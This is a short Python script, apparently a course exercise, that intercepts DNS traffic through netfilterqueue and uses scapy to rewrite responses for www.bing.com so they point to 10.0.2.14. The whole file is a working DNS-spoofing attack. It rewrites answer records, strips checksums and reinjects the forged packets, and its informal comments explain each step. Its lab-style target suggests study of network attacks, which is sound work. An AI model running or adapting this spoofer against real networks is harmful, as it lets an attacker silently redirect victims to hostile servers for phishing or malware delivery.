#!/usr/bin/env python 
import netfilterqueue
import scapy.all as scapy 

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())#this method it will show the accrual content inside the packet itself 
    if scapy_packet.haslayer(scapy.DNSRR):#THIS FOR RESPONSES , put just Q if you need request
    # above we changed or converted this packet 
        qname = scapy_packet[scapy.DNSRR].qname
        if "www.bing.com" in qname :
            print("[+] Spoofing targetet")
            answer = scapy.DNSRR(rrname=qname,rdata="10.0.2.14") #the second arg to redirect
        # print(scapy_packet.show())

            # THIS IS UNDER , THE MODIFYING PART 
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len
            packet.set_payload(str(scapy_packet))# aftert modifying it(scapy_packet), 
            # you need to set it to the received packet from function itself 
        
    # packet.drop()
    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0 , process_packet)
queue.run()